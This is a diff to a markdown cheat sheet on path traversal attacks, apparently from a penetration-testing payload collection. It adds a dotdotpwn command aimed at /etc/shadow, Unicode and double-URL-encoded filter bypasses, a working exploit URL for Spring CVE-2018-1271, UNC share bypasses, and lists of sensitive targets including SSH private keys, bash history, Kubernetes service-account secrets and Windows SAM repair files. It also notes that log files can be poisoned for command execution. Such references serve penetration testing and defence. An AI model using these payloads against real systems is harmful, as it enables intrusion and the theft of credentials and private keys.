@@ -4,8 +4,26 @@
 
 ## Summary
 
+* [Tools](#tools)
 * [Basic exploitation](#basic-exploitation)
+    * [16 bits Unicode encoding](#16-bits-unicode-encoding)
+    * [UTF-8 Unicode encoding](#utf-8-unicode-encoding)
+    * [Bypass "../" replaced by ""](#bypass--replaced-by-)
+    * [Bypass "../" with ";"](#bypass--with-)
+    * [Double URL encoding](#double-url-encoding)
+    * [UNC Bypass](#unc-bypass)
 * [Path Traversal](#path-traversal)
+    * [Interesting Linux files](#interesting-linux-files)
+    * [Interesting Windows files](#interesting-windows-files)
+* [References](#references)
+
+## Tools
+
+- [dotdotpwn - https://github.com/wireghoul/dotdotpwn](https://github.com/wireghoul/dotdotpwn)
+    ```powershell
+    git clone https://github.com/wireghoul/dotdotpwn
+    perl dotdotpwn.pl -h 10.10.10.10 -m ftp -t 300 -f /etc/shadow -s -q -b
+    ```
 
 ## Basic exploitation
 
@@ -22,7 +40,7 @@ We can use the `..` characters to access the parent directory, the following str
 %uff0e%uff0e%u2216
 ```
 
-16 bit Unicode encoding
+### 16 bits Unicode encoding
 
 ```powershell
 . = %u002e
@@ -30,7 +48,7 @@ We can use the `..` characters to access the parent directory, the following str
 \ = %u2216
 ```
 
-UTF-8 Unicode encoding
+### UTF-8 Unicode encoding
 
 ```powershell
 . = %c0%2e, %e0%40%ae, %c0ae
@@ -38,6 +56,7 @@ UTF-8 Unicode encoding
 \ = %c0%5c, %c0%80%5c
 ```
 
+### Bypass "../" replaced by ""
 Sometimes you encounter a WAF which remove the "../" characters from the strings, just duplicate them.
 
 ```powershell
@@ -45,7 +64,14 @@ Sometimes you encounter a WAF which remove the "../" characters from the strings
 ...\.\
 ```
 
-Double URL encoding
+### Bypass "../" with ";"
+
+```powershell
+..;/
+http://domain.tld/page.jsp?include=..;/..;/sensitive.txt 
+```
+
+### Double URL encoding
 
 ```powershell
 . = %252e
@@ -53,10 +79,20 @@ Double URL encoding
 \ = %255c
 ```
 
+**e.g:** Spring MVC Directory Traversal Vulnerability (CVE-2018-1271) with `http://localhost:8080/spring-mvc-showcase/resources/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini`
+
+### UNC Bypass
+
+An attacker can inject a Windows UNC share ('\\UNC\share\name') into a software system to potentially redirect access to an unintended location or arbitrary file.
+
+```powershell
+\\localhost\c$\windows\win.ini
+```
+
 
 ## Path Traversal
 
-Linux - Interesting files to check out :
+### Interesting Linux files
 
 ```powershell
 /etc/issue
@@ -76,9 +112,18 @@ Linux - Interesting files to check out :
 /proc/net/route
 /proc/net/tcp
 /proc/net/udp
+/proc/self/cwd/index.php
+/proc/self/cwd/main.py
+/home/$USER/.bash_history
+/home/$USER/.ssh/id_rsa
+/var/run/secrets/kubernetes.io/serviceaccount
+/var/lib/mlocate/mlocate.db
+/var/lib/mlocate.db
 ```
 
-Windows - Interesting files to check out (Extracted from https://github.com/soffensive/windowsblindread)
+### Interesting Windows files
+
+Interesting files to check out (Extracted from https://github.com/soffensive/windowsblindread)
 
 ```powershell
 c:/boot.ini
@@ -101,6 +146,8 @@ c:/unattend.txt
 c:/unattend.xml
 c:/unattended.txt
 c:/unattended.xml
+c:/windows/repair/sam
+c:/windows/repair/system
 ```
 
 The following log files are controllable and can be included with an evil payload to achieve a command execution
@@ -118,15 +165,7 @@ The following log files are controllable and can be included with an evil payloa
 /var/log/mail
 ```
 
-Other easy win files.
-
-```powershell
-/proc/self/cwd/index.php
-/home/$USER/.bash_history
-/var/run/secrets/kubernetes.io/serviceaccount
-```
-
-
 ## References
 
 * [Directory traversal attack - Wikipedia](https://en.wikipedia.org/wiki/Directory_traversal_attack)
+* [CWE-40: Path Traversal: '\\UNC\share\name\' (Windows UNC Share) - CWE Mitre - December 27, 2018](https://cwe.mitre.org/data/definitions/40.html)
